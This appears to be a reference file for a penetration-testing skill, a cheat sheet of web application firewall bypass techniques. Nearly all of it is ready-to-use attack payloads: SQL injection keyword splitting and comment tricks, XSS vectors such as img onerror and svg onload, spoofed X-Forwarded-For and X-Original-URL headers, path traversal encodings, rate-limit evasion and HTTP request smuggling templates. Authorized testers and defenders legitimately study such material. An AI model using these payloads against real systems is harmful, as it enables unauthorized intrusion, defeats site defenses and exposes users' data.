# WAF Bypass Techniques Reference

Full technique table. Use after SKILL.md's diagnostic steps have identified what's being filtered.

---

## Encoding Reference

### URL Encoding

```
'  -> %27      "  -> %22      <  -> %3c      >  -> %3e
/  -> %2f      \  -> %5c      ;  -> %3b      =  -> %3d
(  -> %28      )  -> %29      space -> %20 or +
```

### Double URL Encoding

```
'  -> %2527     <  -> %253c     >  -> %253e     /  -> %252f
```

### Unicode Encoding

```
'  -> %u0027    <  -> %u003c    /  -> %u002f
```

### HTML Entities (HTML context only)

```
'  -> &#39;  -> &#x27;
<  -> &#60;  -> &#x3c;
>  -> &#62;  -> &#x3e;
"  -> &#34;  -> &#x22;
```

---

## SQL Injection WAF Bypass

### Whitespace Alternatives

```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users       -- tab
SELECT%0ausername%0aFROM%0ausers       -- newline
SELECT%0dusername%0dFROM%0dusers       -- carriage return
```

### Comment Variations

```sql
/*!50000SELECT*/ username FROM users   -- MySQL version comment
SELECT--+%0ausername FROM users
SELECT#%0ausername FROM users          -- MySQL hash comment
```

### Keyword Splitting

```sql
SEL/**/ECT
UN/**/ION SEL/**/ECT
```

### Case Manipulation

```sql
SeLeCt UsErNaMe FrOm UsErS
select USERNAME from USERS
```

### Function Alternatives

```sql
CONCAT('a','b')         -> 'a'||'b'  (Oracle/PgSQL)
SUBSTRING(x,1,1)        -> MID(x,1,1)  ->  LEFT(x,1)
SLEEP(5)                -> BENCHMARK(10000000,SHA1(1))
IF(1=1,SLEEP(3),0)      -> CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END
```

### Operator Alternatives

```sql
AND -> &&  (MySQL: %26%26)
OR  -> ||
=   -> LIKE  ->  REGEXP
```

---

## XSS WAF Bypass

### Tag Alternatives (when script tag is blocked)

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
```

### Event Handler Alternatives

```
onclick, onmouseover, onfocus, onblur, onerror, onload, onstart
ondrag, ondragend, ondragenter, ondragleave, ondragover
onwheel, onscroll, oncopy, onpaste, oncut, onkeydown
onpointerdown, onpointerup, ontransitionend, onanimationend
```

### No Parentheses

```html
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
<!-- String.fromCharCode can also be used to encode the payload chars -->
```

### No Spaces

```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

---

## Header Manipulation

### IP Bypass (rate limits and IP blocks)

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

### HTTP Method Override

```
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
X-HTTP-Method: PATCH
```

### Path Override

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

---

## Path Traversal Bypass

```
../               ..\
..%2f             ..%5c
..%252f           ..%255c     (double encoded)
..%c0%af          ..%c1%9c    (Unicode overlong)
%2e%2e%2f         %2e%2e/
....//            ..././      (after stripping ../)
```

---

## Rate Limit Bypass

```
Path variation:  /api/login -> /API/LOGIN -> /Api/Login -> /api/login/ -> /api//login
HTTP version:    HTTP/1.0 vs HTTP/1.1 vs HTTP/2
Timing:          Burst requests simultaneously rather than sequentially
```

---

## Content Type Bypass

```
application/json  -> application/x-www-form-urlencoded
application/json  -> text/xml
application/json  -> multipart/form-data
application/json  -> application/json;charset=utf-8
```

---

## Request Smuggling (WAF bypass via desync)

### CL.TE (frontend uses Content-Length, backend uses Transfer-Encoding)

Frontend sees one request; backend sees two. WAF inspects the first (benign) body,
backend processes the smuggled second request.

```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (frontend uses Transfer-Encoding, backend uses Content-Length)

```
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

[malicious chunked body with injected second request]
0

```

Use Burp Suite's HTTP Request Smuggler extension for automated CL.TE / TE.CL detection.
